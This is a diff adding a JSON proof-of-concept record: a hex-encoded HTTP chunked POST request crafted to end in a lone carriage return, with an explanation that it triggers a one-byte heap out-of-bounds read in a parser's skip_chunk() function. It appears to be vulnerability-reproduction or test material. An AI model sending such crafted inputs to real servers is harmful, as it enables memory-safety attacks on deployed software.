@@ -1,0 +1,5 @@
+{
+  "hex_bytes": "50 4F 53 54 20 2F 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 78 0D 0A 54 72 61 6E 73 66 65 72 2D 45 6E 63 6F 64 69 6E 67 3A 20 63 68 75 6E 6B 65 64 0D 0A 0D 0A 32 0D 0A 61 62 0D",
+  "explanation": "HTTP/1.1 POST with Host and Transfer-Encoding: chunked. Body is a single 2-byte chunk: '2\\r\\n' then 'ab' then only a '\\r' (no trailing '\\n'). This satisfies: valid chunk size line with CRLF, exactly 2 data bytes. At the CRLF check after the data, len == i + 1 (buffer ends at the '\\r'), so skip_chunk() evaluates buf[i] then buf[i+1], reading one byte past the buffer due to the flawed guard (len < i + 1).",
+  "expected_effect": "One-byte heap out-of-bounds read at buf[i+1] in skip_chunk() while validating the post-data CRLF (heap-buffer-over-read)."
+}
